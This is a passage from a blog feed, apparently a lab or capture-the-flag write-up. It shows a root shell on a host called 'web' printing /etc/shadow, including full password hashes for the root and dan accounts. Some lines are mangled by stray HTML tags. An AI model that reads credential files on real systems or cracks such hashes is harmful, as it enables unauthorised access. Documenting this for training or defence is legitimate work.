<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@web:~# cat /etc/shadow
</span><span class='line'>root:$6$aO1TGdyc$XfiMyap/.QYhjIip5xxrgpO1ydlo.DQXns3fYYLt1hiH4Fp0PJP4TMoDSg3wpAFklF03dV2cUDL04YcR9bSSI/:15101:0:99999:7:::
</span><span class='line'>daemon:&lt;em>:15101:0:99999:7:::
</span><span class='line'>bin:&lt;/em>:15101:0:99999:7:::
</span><span class='line'>sys:&lt;em>:15101:0:99999:7:::
</span><span class='line'>sync:&lt;/em>:15101:0:99999:7:::
</span><span class='line'>games:&lt;em>:15101:0:99999:7:::
</span><span class='line'>man:&lt;/em>:15101:0:99999:7:::
</span><span class='line'>lp:&lt;em>:15101:0:99999:7:::
</span><span class='line'>mail:&lt;/em>:15101:0:99999:7:::
</span><span class='line'>&lt;a href="news:*:15101:0:99999:7:::">news:*:15101:0:99999:7:::&lt;/a>
</span><span class='line'>uucp:&lt;em>:15101:0:99999:7:::
</span><span class='line'>proxy:&lt;/em>:15101:0:99999:7:::
</span><span class='line'>www-data:&lt;em>:15101:0:99999:7:::
</span><span class='line'>backup:&lt;/em>:15101:0:99999:7:::
</span><span class='line'>list:&lt;em>:15101:0:99999:7:::
</span><span class='line'>irc:&lt;/em>:15101:0:99999:7:::
</span><span class='line'>gnats:&lt;em>:15101:0:99999:7:::
</span><span class='line'>nobody:&lt;/em>:15101:0:99999:7:::
</span><span class='line'>libuuid:!:15101:0:99999:7:::
</span><span class='line'>syslog:&lt;em>:15101:0:99999:7:::
</span><span class='line'>mysql:!:15101:0:99999:7:::
</span><span class='line'>sshd:&lt;/em>:15101:0:99999:7:::
</span><span class='line'>landscape:*:15101:0:99999:7:::
</span><span class='line'>dan:$6$Iu1ipXkP$F9Jdj7JNf56/UjrXgOTks3mqYO6J/ErWUtf.EWr2AT8lv6aHy3K6Ywjmd7HCUswgiEYDHMwq/aqwJToXl0ERs1:15101:0:99999:7:::</span></code></pre></td></tr></table></div></figure></p>
]]></content>
  </entry>
  
</feed>
